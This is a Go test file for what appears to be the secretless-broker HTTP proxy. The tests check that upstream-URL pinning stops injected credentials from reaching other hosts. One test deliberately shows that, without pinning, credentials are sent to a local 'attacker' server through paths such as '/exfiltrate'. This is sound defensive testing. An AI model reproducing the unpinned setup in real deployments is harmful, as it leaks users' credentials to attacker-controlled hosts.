package http

import (
	"net"
	gohttp "net/http"
	"net/http/httptest"
	"net/url"
	"regexp"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/cyberark/secretless-broker/internal/log"
	"github.com/cyberark/secretless-broker/pkg/secretless/plugin/connector"
	httpconnector "github.com/cyberark/secretless-broker/pkg/secretless/plugin/connector/http"
)

var _ httpconnector.Connector = &fakeConnector{}

// fakeConnector injects a credential header into the request.
type fakeConnector struct{}

func (f *fakeConnector) Connect(r *gohttp.Request, _ connector.CredentialValuesByID) error {
	r.Header.Set("Authorization", "Basic secret-credential")
	return nil
}

// TestUpstreamURL_BlocksRequestToWrongHost verifies that when upstreamURL is
// configured, requests to a non-matching host are rejected with 403 and
// credentials are never injected or forwarded.
func TestUpstreamURL_BlocksRequestToWrongHost(t *testing.T) {
	// Set up a legitimate upstream server.
	legitimateURL, _ := url.Parse("http://api.legitimate.com:9999")

	// Set up an "attacker" server that should not receive any requests.
	attackerGotRequest := false
	attacker := httptest.NewServer(gohttp.HandlerFunc(func(w gohttp.ResponseWriter, r *gohttp.Request) {
		attackerGotRequest = true
		w.WriteHeader(200)
	}))
	defer attacker.Close()

	// Create a proxy service with upstreamURL pinned to the legitimate server.
	listener, err := net.Listen("tcp", "127.0.0.1:0")
	require.NoError(t, err)

	logger := log.New(false)

	subservices := []Subservice{
		{
			ConnectorID: "basic_auth",
			Connector:   &fakeConnector{},
			RetrieveCredentials: func() (map[string][]byte, error) {
				return map[string][]byte{"username": []byte("user"), "password": []byte("pass")}, nil
			},
			AuthenticateURLsMatching: []*regexp.Regexp{regexp.MustCompile(".*")},
			UpstreamURL:              legitimateURL,
		},
	}

	svc, err := NewProxyService(subservices, listener, logger)
	require.NoError(t, err)
	require.NoError(t, svc.Start())
	defer svc.Stop()

	// Client sends a request to the attacker host via the proxy.
	proxyURL, _ := url.Parse("http://" + listener.Addr().String())
	client := &gohttp.Client{
		Transport: &gohttp.Transport{
			Proxy: gohttp.ProxyURL(proxyURL),
		},
	}

	resp, err := client.Get(attacker.URL + "/steal-creds")
	require.NoError(t, err)
	defer resp.Body.Close()

	assert.Equal(t, 403, resp.StatusCode)
	assert.False(t, attackerGotRequest, "attacker server must NOT receive the request")
}

// TestUpstreamURL_AllowsRequestToCorrectHost verifies that requests targeting
// the configured upstream host are forwarded with credentials injected.
func TestUpstreamURL_AllowsRequestToCorrectHost(t *testing.T) {
	// Set up the legitimate upstream server.
	var receivedAuth string
	var receivedPath string
	legitimate := httptest.NewServer(gohttp.HandlerFunc(func(w gohttp.ResponseWriter, r *gohttp.Request) {
		receivedAuth = r.Header.Get("Authorization")
		receivedPath = r.URL.Path
		w.WriteHeader(200)
	}))
	defer legitimate.Close()

	legitimateURL, _ := url.Parse(legitimate.URL)

	listener, err := net.Listen("tcp", "127.0.0.1:0")
	require.NoError(t, err)

	logger := log.New(false)

	subservices := []Subservice{
		{
			ConnectorID: "basic_auth",
			Connector:   &fakeConnector{},
			RetrieveCredentials: func() (map[string][]byte, error) {
				return map[string][]byte{"username": []byte("user"), "password": []byte("pass")}, nil
			},
			AuthenticateURLsMatching: []*regexp.Regexp{regexp.MustCompile(".*")},
			UpstreamURL:              legitimateURL,
		},
	}

	svc, err := NewProxyService(subservices, listener, logger)
	require.NoError(t, err)
	require.NoError(t, svc.Start())
	defer svc.Stop()

	// Client sends a request to the correct host via the proxy.
	proxyURL, _ := url.Parse("http://" + listener.Addr().String())
	client := &gohttp.Client{
		Transport: &gohttp.Transport{
			Proxy: gohttp.ProxyURL(proxyURL),
		},
	}

	resp, err := client.Get(legitimate.URL + "/v1/charges")
	require.NoError(t, err)
	defer resp.Body.Close()

	assert.Equal(t, 200, resp.StatusCode)
	assert.Equal(t, "Basic secret-credential", receivedAuth)
	assert.Equal(t, "/v1/charges", receivedPath)
}

// TestWithoutUpstreamURL_AttackerReceivesCredentials demonstrates that
// without upstreamURL, credentials are sent to whatever
// host the client specifies.
func TestWithoutUpstreamURL_AttackerReceivesCredentials(t *testing.T) {
	// Set up an "attacker" server.
	var attackerReceivedAuth string
	attacker := httptest.NewServer(gohttp.HandlerFunc(func(w gohttp.ResponseWriter, r *gohttp.Request) {
		attackerReceivedAuth = r.Header.Get("Authorization")
		w.WriteHeader(200)
	}))
	defer attacker.Close()

	// Create a proxy service without upstreamURL.
	listener, err := net.Listen("tcp", "127.0.0.1:0")
	require.NoError(t, err)

	logger := log.New(false)

	subservices := []Subservice{
		{
			ConnectorID: "basic_auth",
			Connector:   &fakeConnector{},
			RetrieveCredentials: func() (map[string][]byte, error) {
				return map[string][]byte{"username": []byte("user"), "password": []byte("pass")}, nil
			},
			AuthenticateURLsMatching: []*regexp.Regexp{regexp.MustCompile(".*")},
			// UpstreamURL is nil
		},
	}

	svc, err := NewProxyService(subservices, listener, logger)
	require.NoError(t, err)
	require.NoError(t, svc.Start())
	defer svc.Stop()

	// Client sends a request to the attacker host via the proxy.
	proxyURL, _ := url.Parse("http://" + listener.Addr().String())
	client := &gohttp.Client{
		Transport: &gohttp.Transport{
			Proxy: gohttp.ProxyURL(proxyURL),
		},
	}

	resp, err := client.Get(attacker.URL + "/exfiltrate")
	require.NoError(t, err)
	defer resp.Body.Close()

	assert.Equal(t, "Basic secret-credential", attackerReceivedAuth)
}
